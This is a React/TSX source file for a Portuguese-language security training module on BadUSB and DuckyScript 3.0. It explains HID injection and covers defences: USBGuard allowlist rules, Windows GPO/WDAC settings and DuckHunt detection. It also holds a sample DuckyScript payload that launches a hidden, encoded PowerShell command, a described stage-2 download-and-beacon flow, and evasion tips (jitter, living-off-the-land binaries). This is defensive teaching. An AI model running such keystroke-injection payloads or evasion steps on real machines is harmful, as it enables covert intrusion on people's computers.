import { getModuleMetadata } from '@/lib/metadata';
import { ModuleLayout } from '@/components/ModuleLayout';
import type { QuizQuestion } from '@/components/ModuleLayout';
import {
  Section,
  Callout,
  CodeBlock,
  InlineCode,
  ComparisonTable,
  KeyValue,
  FlowDiagram,
  Timeline,
  DecisionBox,
  ArchFlow,
  NodeGraph,
  AnnotatedFormula,
  MindMap,
  QAItem,
} from '@/components/article/primitives';

export const metadata = getModuleMetadata('badusb-duckyscript-defesa');
const accent = '#22c55e';

const quiz: QuizQuestion[] = [
  {
    question: 'Por que um BadUSB é eficaz mesmo em sistemas com mass storage USB bloqueado por GPO?',
    options: [
      'Porque ele cripta o tráfego USB.',
      'Porque enumera como classe HID (0x03) — teclado — e não como mass storage (0x08); políticas focadas só em storage não filtram HID. O OS confia no descritor da classe.',
      'Porque usa Bluetooth em paralelo para evadir.',
      'Porque tem certificado digital Microsoft.',
    ],
    correct: 1,
    explanation:
      'A separação por classe é o calcanhar: bloquear mass storage (USB drives) é fácil, bloquear HID é trabalhoso porque inviabiliza teclado/mouse. BadUSB explora exatamente essa assimetria — declara-se HID e injeta keystrokes em ~1000 wpm.',
  },
  {
    question: 'O que é Keystroke Reflection no DuckyScript 3.0?',
    options: [
      'Modo de espelhar a tela do alvo.',
      'Canal lateral de exfiltração: o atacante lê o estado dos LEDs do teclado (Caps/Num/Scroll Lock) — que o OS define em resposta a comandos — para extrair dados bit-a-bit do alvo de volta ao Ducky.',
      'Detecção automática de teclados USB conectados.',
      'Reflexão de keystrokes via Bluetooth.',
    ],
    correct: 1,
    explanation:
      'Os LEDs Caps/Num/Scroll viram bits de saída controlados pelo OS. DuckyScript 3.0 lê via interface HID a transição desses LEDs e reconstrói dados (ex: variável que o script setou no alvo). Canal de retorno em ambiente sem Internet.',
  },
  {
    question: 'Qual é a diferença prática entre BadUSB cabeado e BadKB (Bluetooth)?',
    options: [
      'BadKB é mais rápido.',
      'BadKB pareia como teclado HID via Bluetooth LE — sem necessidade de plugar fisicamente. Útil em air-gapped attacks ou alvos com USB bloqueado, mas exige proximidade física e bypass de pareamento (alvo pareando ou já pareado).',
      'BadKB funciona em iOS, BadUSB não.',
      'BadKB usa AES-256 obrigatoriamente.',
    ],
    correct: 1,
    explanation:
      'BadKB (firmware Momentum/Xtreme) usa BLE HID. Vantagem: sem cabo, fácil esconder. Limitação: alvo precisa ter Bluetooth ligado e aceitar pareamento (ou já ter aceito antes), o que exige timing/social engineering. macOS/Linux/Android costumam ser mais permissivos que Windows nesse ponto.',
  },
  {
    question: 'Em uma defesa Linux com USBGuard, qual a estratégia correta contra BadUSB?',
    options: [
      'Bloquear todos os devices USB sem exceção.',
      'Política default block + allowlist por VendorID:ProductID:serial dos dispositivos legítimos já cadastrados; novos HIDs exigem confirmação interativa via usbguard-applet.',
      'Bloquear só mass storage e permitir o resto.',
      'Desabilitar o stack USB do kernel.',
    ],
    correct: 1,
    explanation:
      'USBGuard é allowlisting baseado em descritor. Default block, exceção por VID:PID:serial. Atacante não consegue forjar o serial exato de um teclado já cadastrado sem inspecionar fisicamente o original. Combine com usbguard-applet para handle de novos devices.',
  },
  {
    question: 'Como o DuckHunt detecta BadUSB?',
    options: [
      'Via assinatura de hardware do Rubber Ducky.',
      'Monitora WPM (palavras por minuto) e timing inter-keystroke; rejeita / alerta quando velocidade > 800 wpm ou padrão regular demais (sem variabilidade humana).',
      'Bloqueia toda porta USB enquanto aguardando autenticação.',
      'Usa deep learning para classificar teclas.',
    ],
    correct: 1,
    explanation:
      'Humanos digitam em padrão irregular, com erros e correções, raramente passam de 200 wpm sustentados. Ducky injeta a 1000+ wpm com timing milimetricamente regular. DuckHunt (daemon Windows) detecta isso comportamentalmente — defesa heurística complementar a allowlist.',
  },
  {
    question: 'Em pentest profissional, o que é mandatório antes de usar BadUSB no cliente?',
    options: [
      'Permissão verbal do gerente de TI.',
      'Cláusula explícita no Rules of Engagement (RoE) autorizando "physical access" e "HID injection" — pode disparar resposta automatizada do EDR e gerar incidente real, comprometendo o teste e gerando responsabilidade civil/criminal sem documento.',
      'Antivírus desligado no alvo.',
      'Script registrado em cartório.',
    ],
    correct: 1,
    explanation:
      'BadUSB é vetor agressivo: dispara EDR/SIEM, pode causar lockout de conta, gerar incidente que custa horas de SOC. RoE escrito + janela combinada + canal de comunicação durante o teste são obrigatórios. Sem RoE = invasão criminal mesmo num cliente "amigo".',
  },
];

export default function Page() {
  return (
    <ModuleLayout
      slug="badusb-duckyscript-defesa"
      title="BadUSB e DuckyScript 3.0: ataque + defesa (USBGuard, GPO)"
      icon="🦆"
      xp={70}
      readTime={13}
      trailName="Flipper Zero & Hardware Hacking"
      trailColor={accent}
      nextSlug="gpio-projetos-praticos"
      nextTitle="GPIO: I2C, SPI, UART, PWM com sensores e MCUs externos"
      quiz={quiz}
    >
      <Section title="O modelo de confiança que o USB vendeu" accent={accent}>
        <p className="text-sm leading-7" style={{ color: 'var(--ffv-muted)' }}>
          O USB foi desenhado para ser <em>plug and play</em>. O device, ao ser conectado, envia ao
          host um <strong>device descriptor</strong> com VID:PID, classe, subclasse e protocolo. O
          kernel do OS lê isso, carrega o driver correspondente, e pronto — funciona. <strong>Não há
          autenticação</strong>. Não há "este teclado é confiável?". O OS confia que se o device diz
          que é teclado, é teclado.
        </p>

        <Callout tone="danger" icon="🦆">
          <strong>BadUSB é a exploração canônica dessa decisão arquitetural.</strong> Apresentado por
          Karsten Nohl no Black Hat 2014 ("BadUSB - On Accessories that Turn Evil"), o conceito
          mostrou que <em>qualquer</em> device USB pode ser reprogramado para mudar de classe e
          enumerar como HID — e o OS aceita.
        </Callout>
      </Section>

      <Section title="Anatomia do USB device descriptor" accent={accent}>
        <AnnotatedFormula
          accent={accent}
          title="USB Device Descriptor (campos relevantes para BadUSB)"
          formula="[ VID(2B) | PID(2B) | bDeviceClass | bDeviceSubClass | bDeviceProtocol | iSerialNumber | bcdUSB | bMaxPacketSize0 ]"
          parts={[
            { text: 'VID:PID', annotation: 'IDs do fabricante (ex: 046d:c31c = Logitech keyboard). Fácil de forjar.' },
            { text: 'bDeviceClass', annotation: '0x03 = HID, 0x08 = Mass Storage, 0x09 = Hub, 0x0E = Video. BadUSB declara 0x03.', highlight: true },
            { text: 'bDeviceSubClass', annotation: 'Para HID: 0x01 = Boot Interface (teclado/mouse padrão BIOS), aceito por todos OSes.' },
            { text: 'iSerialNumber', annotation: 'Serial string. USBGuard usa para allowlisting fino.', highlight: true },
          ]}
        />

        <CodeBlock lang="bash">
{`# Inspecionar device USB conectado (Linux):
$ lsusb
Bus 003 Device 005: ID 046d:c31c Logitech, Inc. Keyboard

$ lsusb -v -d 046d:c31c
Device Descriptor:
  bDeviceClass            0    (Defined at Interface level)
  ...
  iSerialNumber           0
Interface Descriptor:
  bInterfaceClass         3 Human Interface Device
  bInterfaceSubClass      1 Boot Interface Subclass
  bInterfaceProtocol      1 Keyboard
  iInterface              0`}
        </CodeBlock>
      </Section>

      <Section title="Fluxo de ataque: do plug ao shell" accent={accent}>
        <FlowDiagram
          accent={accent}
          title="BadUSB ataca um Windows desbloqueado"
          orientation="vertical"
          steps={[
            { icon: '🔌', label: 'Plug do Flipper / Rubber Ducky', desc: 'enumera como HID Boot Keyboard (classe 0x03)' },
            { icon: '⚙️', label: 'Kernel registra teclado', desc: 'carrega driver HID genérico, sem prompt ao usuário' },
            { icon: '⏱️', label: 'DELAY 1000 (1 segundo)', desc: 'aguarda OS terminar enumeração e ganhar foco no desktop' },
            { icon: '⌨️', label: 'GUI r → "powershell" → ENTER', desc: 'abre terminal com privilégio do usuário corrente' },
            { icon: '📥', label: 'Invoke-WebRequest payload.ps1 + execute', desc: 'baixa stage 2: implante, persistência, beacon C2' },
            { icon: '🧹', label: 'Cleanup', desc: 'fecha janela, limpa Run history, sai sem traços visuais' },
          ]}
        />

        <Callout tone="warn" icon="⏰">
          Tempo total: <strong>3-8 segundos</strong> em PC desbloqueado. Em sistema bloqueado
          (lockscreen) o ataque falha — não há janela de foco. Por isso bloqueio de tela é a defesa
          física mais subestimada.
        </Callout>
      </Section>

      <Section title="DuckyScript 3.0: a linguagem moderna" accent={accent}>
        <p className="text-sm leading-7" style={{ color: 'var(--ffv-muted)' }}>
          DuckyScript 3.0 (Hak5, lançado em 2022 com USB Rubber Ducky Mark II, retrofitted no Flipper
          Zero) saiu do "linguagem linear de teclas" da v1 para uma <strong>linguagem de programação
          embutida</strong>: variáveis, expressões aritméticas, controle de fluxo, funções,
          detecção de OS, e canais laterais de exfiltração via LEDs.
        </p>

        <CodeBlock lang="text" filename="payload.dd (DuckyScript 3.0)">
{`REM === Payload didático: detecta OS e abre terminal apropriado ===
REM === RoE check: requer autorização escrita do cliente ===

DEFINE #DELAY_BOOT 1500
DEFINE #DELAY_TYPE 50

VAR $os = 0
REM Detecção de OS via toggle de Caps Lock e leitura do LED:
LED_OFF
INJECT_MOD CAPSLOCK
DELAY 50
IF ($_CAPSLOCK_ON == TRUE) THEN
  REM Windows / Linux respondem ao toggle imediatamente
  $os = 1
ELSE
  REM macOS pode demorar mais
  $os = 2
END_IF
INJECT_MOD CAPSLOCK
DELAY 50

IF ($os == 1) THEN
  REM Windows: abrir Run e iniciar PowerShell discreto
  DELAY #DELAY_BOOT
  GUI r
  DELAY 500
  STRING powershell -WindowStyle Hidden -EncodedCommand JABzAD0AIgBoAGUAbABsAG8A
  ENTER
ELSE
  REM macOS: Spotlight + Terminal
  DELAY #DELAY_BOOT
  GUI SPACE
  DELAY 500
  STRING terminal
  ENTER
  DELAY 1000
  STRING echo "RoE-test marker $(date)" \\>\\> /tmp/pentest.log
  ENTER
END_IF

REM Exfiltração via Keystroke Reflection:
REM — força CAPSLOCK toggle em pattern que codifica byte do hostname
REM — atacante na ponta lê o LED HID de volta
REM (omitido para didática; ver docs Hak5 v3)
`}
        </CodeBlock>

        <ComparisonTable
          accent={accent}
          headers={['Recurso', 'DuckyScript 1.0', 'DuckyScript 3.0']}
          rows={[
            ['Variáveis', 'não', 'sim ($var, #const)'],
            ['Controle de fluxo', 'não', 'IF/ELSE, WHILE, FUNCTION'],
            ['Aritmética', 'não', 'sim (+, -, *, /, %, comparações)'],
            ['Detecção de OS', 'não', 'sim (via timing CAPSLOCK)'],
            ['Keystroke Reflection (canal lateral)', 'não', 'sim — exfil via LEDs HID'],
            ['Jitter / randomização', 'não', 'sim (defesa contra DuckHunt)'],
            ['Modo Storage atacável', 'não', 'sim (HID + MSC simultâneo)'],
            ['Encoder', 'externo (Java)', 'compilador Hak5 oficial / ducky-decode comunitário'],
          ]}
        />
      </Section>

      <Section title="BadKB: a versão Bluetooth" accent={accent}>
        <ArchFlow
          accent={accent}
          title="BadKB — HID via Bluetooth LE"
          columns={[
            {
              header: 'Pareamento',
              headerColor: '#0ea5e9',
              items: ['Anuncia como teclado BLE (HID Service 0x1812)', 'Nome customizável: "Magic Keyboard", "Logitech K380"', 'Alvo precisa aceitar pareamento (ou já estar pareado)'],
              footer: 'Vetor social: nome plausível + timing de "novo teclado disponível"',
            },
            {
              header: 'Vantagens vs cabeado',
              headerColor: accent,
              items: ['Sem necessidade de plugar', 'Funciona em air-gap relativo', 'Range BLE: 10-30m', 'Esconde no bolso / mochila'],
              footer: 'iOS 14+, Android 10+, macOS, Linux: HID BLE nativo',
            },
            {
              header: 'Limitações',
              headerColor: '#f59e0b',
              items: ['Windows mais restritivo no auto-conectar', 'Pareamento pode pedir PIN', 'Bateria do Flipper drena rápido em BLE TX'],
              footer: 'Ainda assim: vetor real e crescente',
            },
          ]}
        />

        <Callout tone="info" icon="📱">
          Firmwares <InlineCode>Momentum</InlineCode> e <InlineCode>Xtreme</InlineCode> (third-party
          do Flipper) trazem <strong>Bad BT / BadKB</strong> embutidos com a mesma sintaxe de
          DuckyScript 3.0. A escolha entre BadUSB e BadKB depende do RoE: se "physical access ao
          USB" foi autorizado mas "wireless device" não, BadKB pode estar fora do escopo.
        </Callout>
      </Section>

      <Section title="Defesa em camadas — Linux: USBGuard" accent={accent}>
        <p className="text-sm leading-7" style={{ color: 'var(--ffv-muted)' }}>
          <strong>USBGuard</strong> (github.com/USBGuard/usbguard) é um framework de allowlisting
          USB para Linux. Implementa política baseada em descritor: VID:PID:serial:hash. Default
          policy <InlineCode>block</InlineCode>; novos devices ficam pendentes até aprovação.
        </p>

        <CodeBlock lang="bash" filename="/etc/usbguard/rules.conf">
{`# Allowlist explícita — apenas estes devices podem se conectar:

# Meu teclado Logitech K380 — VID:PID + serial fixo
allow id 046d:b342 serial "5C-71-0D-7B-3E-44" name "Logitech K380"

# Meu mouse específico
allow id 046d:c52b serial "abcdef123456" name "Logitech Unifying"

# Hub USB confiável
allow id 05e3:0610 name "Genesys Logic 4-port hub"

# Todo o resto: BLOCK (default policy abaixo)
block

# Mass storage NUNCA — mesmo que pareça inofensivo:
block with-interface 08:*:*

# HID novo: só com confirmação interativa via usbguard-applet
block with-interface 03:*:*`}
        </CodeBlock>

        <CodeBlock lang="bash">
{`# Comandos cotidianos:
$ sudo usbguard list-devices           # mostra todos os USBs e estado
$ sudo usbguard generate-policy        # gera allowlist do que está conectado AGORA
$ sudo usbguard allow-device 14        # autoriza device #14
$ sudo usbguard block-device 14
$ systemctl enable --now usbguard      # ativa o daemon

# GUI: instalar usbguard-applet-qt para prompt visual ao plugar novo device.`}
        </CodeBlock>

        <Callout tone="success" icon="🛡️">
          <strong>Por que isso funciona contra BadUSB:</strong> o atacante teria que clonar
          VID:PID:serial:hash de um device já cadastrado. VID:PID é trivial. Serial é fácil se ele
          inspecionou seu teclado fisicamente antes. Mas contra um adversário que nunca tocou seu
          equipamento, essa allowlist é uma barreira concreta — qualquer device novo será
          bloqueado.
        </Callout>
      </Section>

      <Section title="Defesa em camadas — Windows: GPO + Intune" accent={accent}>
        <KeyValue
          accent={accent}
          items={[
            { k: 'GPO Device Installation Restrictions', v: 'Computer Configuration → Administrative Templates → System → Device Installation. Habilite "Prevent installation of devices not described by other policy settings"; popule allowlist por Hardware ID / Compatible ID dos teclados/mouses corporativos.' },
            { k: 'BitLocker + autenticação pré-boot', v: 'BadUSB falha contra máquina bloqueada. PIN pré-boot + BitLocker eleva o custo de exploração física.' },
            { k: 'Defender for Endpoint (MDE)', v: 'Detecta IOC: "novo HID enumerado" + "PowerShell/cmd executado em <5s" + "outbound network call" como sequência suspeita. Alerta SOC.' },
            { k: 'PowerShell ConstrainedLanguage', v: 'PSLanguageMode = ConstrainedLanguage via WDAC. Restringe COM, .NET reflection, Add-Type. Payloads complexos quebram.' },
            { k: 'WDAC (Windows Defender Application Control)', v: 'Allowlist de binários assinados. PowerShell/cmd ainda executa, mas qualquer dropper não-assinado (stage 2) falha.' },
            { k: 'Intune Endpoint Protection', v: 'Centralização da política. Em flota grande, Intune + Defender + Conditional Access = base obrigatória.' },
          ]}
        />
      </Section>

      <Section title="Defesa comportamental: DuckHunt" accent={accent}>
        <FlowDiagram
          accent={accent}
          title="DuckHunt — heurística de WPM"
          orientation="horizontal"
          steps={[
            { icon: '👁️', label: 'Hooka WH_KEYBOARD_LL', desc: 'monitora cada keystroke globalmente' },
            { icon: '⏱️', label: 'Mede intervalo entre teclas', desc: 'humano: 100-300ms variável' },
            { icon: '📊', label: 'Calcula WPM rolante', desc: 'janela de 500ms' },
            { icon: '🚨', label: 'WPM > 800 → suspeito', desc: 'pode bloquear input ou alertar' },
          ]}
        />

        <Callout tone="info" icon="🎯">
          DuckHunt é <strong>heurística complementar</strong>, não silver bullet. DuckyScript 3.0
          tem mode <InlineCode>JITTER</InlineCode> que randomiza intervalo entre teclas (50-200ms)
          para parecer humano. Mas, ao ativar JITTER, o ataque demora mais — janela maior para
          detecção por outros sinais (PowerShell launch, network call). Defesa em camadas: cada
          camada não precisa ser perfeita; conjunto é robusto.
        </Callout>
      </Section>

      <Section title="O ponto crucial: USB blocking ≠ HID blocking" accent={accent}>
        <DecisionBox
          scenario="Quero proteger endpoints corporativos contra BadUSB"
          winner="HID allowlist + PowerShell hardening + EDR comportamental + bloqueio de tela enforced"
          winnerColor={accent}
          why="Bloquear só mass storage (USB drives) é cosmético contra BadUSB — o vetor é HID. Defesa real exige allowlist por VID:PID:serial DOS HIDs (USBGuard / GPO Device Install) + restrição de PowerShell/cmd (ConstrainedLanguage + WDAC) + EDR detectando IOCs comportamentais + bloqueio de tela (15s idle máx) que neutraliza o ataque físico."
          alternatives={[
            { name: 'Só "desabilitar USB" no BIOS', when: 'Inviável — usuários precisam de teclado/mouse/headset USB.' },
            { name: 'Só treinar usuários ("não plugue cabos estranhos")', when: 'Camada útil, mas BadUSB pode chegar como teclado oferecido por colega comprometido.' },
            { name: 'Air gap total', when: 'Para sistemas críticos isolados (SCADA, defense). Mas BadKB BLE pode contornar — air gap não é gap absoluto.' },
          ]}
        />
      </Section>

      <Section title="Linha do tempo BadUSB" accent={accent}>
        <Timeline
          accent={accent}
          title="Marcos do vetor"
          events={[
            { when: '2010', label: 'Hak5 USB Rubber Ducky Mark I', detail: 'Primeira ferramenta comercial focada em BadUSB-style HID injection.' },
            { when: '2014', label: 'Karsten Nohl — BadUSB no Black Hat', detail: 'Mostra que firmware de qualquer USB pode ser reescrito para mudar de classe.', highlight: true },
            { when: '2017', label: 'Bash Bunny Hak5', detail: 'Multi-vetor: HID + storage + ethernet emulation simultâneos.' },
            { when: '2020', label: 'O.MG Cable', detail: 'Cabo USB-C "normal" com BadUSB embutido — vetor de supply chain.' },
            { when: '2022', label: 'DuckyScript 3.0 + Rubber Ducky Mark II', detail: 'Linguagem programável + Keystroke Reflection.', highlight: true },
            { when: '2023+', label: 'Flipper Zero BadUSB', detail: 'Acessível: $169 com BadUSB + BadBT + NFC + RFID + IR.' },
            { when: '2024+', label: 'BadKB BLE em firmwares third-party', detail: 'Momentum/Xtreme — HID via Bluetooth LE.' },
          ]}
        />
      </Section>

      <Section title="Q&A operacional" accent={accent}>
        <QAItem
          q="Posso testar BadUSB no meu próprio laptop sem RoE?"
          a={
            <>
              No seu equipamento pessoal, sim. Em equipamento corporativo: não — mesmo que você seja
              admin de TI, política da empresa pode classificar como uso não autorizado. Em cliente
              de pentest: <strong>RoE escrito é mandatório</strong>. BadUSB pode disparar EDR e gerar
              incidente real (custo de SOC, lockout) — sem RoE você é o atacante criminal aos olhos
              do contrato, mesmo "ajudando".
            </>
          }
        />

        <QAItem
          q="Antivírus moderno detecta payload baixado via BadUSB?"
          a={
            <>
              Geralmente sim — AMSI, behavioral monitoring e EDR detectam PowerShell suspeito,
              Invoke-WebRequest para domínio novo, decode de Base64 grande, etc. Por isso payloads
              modernos usam <em>living-off-the-land</em> (binários nativos do Windows: certutil,
              bitsadmin, mshta) ou cargas ofuscadas. É um cat-and-mouse: defesa também evolui.
            </>
          }
        />

        <QAItem
          q="Qual o vetor mais perigoso BadUSB que NÃO é Flipper / Rubber Ducky?"
          a={
            <>
              <strong>O.MG Cable</strong> (mg.lol) — um cabo USB-C ou Lightning <em>visualmente
              idêntico</em> a um Apple/Anker original, mas com chip BadUSB + Wi-Fi embutido. Você
              pluga "para carregar o telefone" e o cabo está injetando. Vetor de supply chain
              (alguém te dá de presente, troca o seu, deixa na sala de reunião). Defesa: cabos só
              do bolso ou comprados por canal confiável.
            </>
          }
        />
      </Section>

      <Section title="MindMap final" accent={accent}>
        <MindMap
          accent={accent}
          root="BadUSB ataque & defesa"
          branches={[
            {
              title: 'Por que funciona',
              items: ['USB confia em descritor de classe', 'HID (0x03) não filtrado por padrão', 'Velocidade de injeção 1000+ wpm', 'Janela curta = baixa detecção'],
            },
            {
              title: 'Vetores',
              items: ['Pendrive Rubber Ducky', 'Flipper Zero BadUSB', 'O.MG Cable (supply chain)', 'BadKB Bluetooth LE'],
            },
            {
              title: 'Defesas em camadas',
              items: ['Allowlist HID por VID:PID:serial (USBGuard / GPO)', 'PowerShell ConstrainedLanguage + WDAC', 'EDR comportamental + DuckHunt heurística', 'Lockscreen <15s idle'],
            },
            {
              title: 'Pentest profissional',
              items: ['RoE escrito obrigatório', 'Janela e canal combinados', 'Payload reversível e logado', 'Documentar IOCs gerados para o cliente'],
            },
          ]}
        />

        <NodeGraph
          accent={accent}
          title="Referências"
          legend="Bookmarke; volte aqui sempre"
          columns={[
            {
              label: 'Hak5 oficial',
              nodes: [
                { icon: '📘', label: 'docs.hak5.org/hak5-usb-rubber-ducky/', sub: 'DuckyScript 3.0 reference' },
                { icon: '📘', label: 'shop.hak5.org', sub: 'hardware oficial' },
              ],
            },
            {
              label: 'Payloads',
              nodes: [
                { icon: '🐙', label: 'github.com/hak5/usbrubberducky-payloads', sub: 'biblioteca curada' },
                { icon: '🐙', label: 'github.com/UberGuidoZ/Flipper', sub: 'BadUSB scripts para Flipper' },
              ],
            },
            {
              label: 'Defesa',
              nodes: [
                { icon: '🛡️', label: 'github.com/USBGuard/usbguard', sub: 'allowlisting Linux' },
                { icon: '🛡️', label: 'pmsosa/duckhunt', sub: 'detecção comportamental Windows' },
                { icon: '🛡️', label: 'docs.microsoft.com WDAC', sub: 'Windows app control' },
              ],
            },
            {
              label: 'História',
              nodes: [
                { icon: '🎤', label: 'BadUSB Black Hat 2014', sub: 'Karsten Nohl — vídeo no YouTube' },
                { icon: '📰', label: 'hackaday.com BadUSB tag', sub: 'cobertura contínua' },
              ],
            },
          ]}
        />

        <Callout tone="warn" icon="⚖️">
          Este módulo tem foco didático: entender o vetor → desenhar defesa. Uso ofensivo sem RoE é
          crime (Art. 154-A CP no Brasil + correspondentes internacionais). A FFV Academy ensina a
          mecânica para você <em>defender</em>, não para invadir.
        </Callout>
      </Section>
    </ModuleLayout>
  );
}
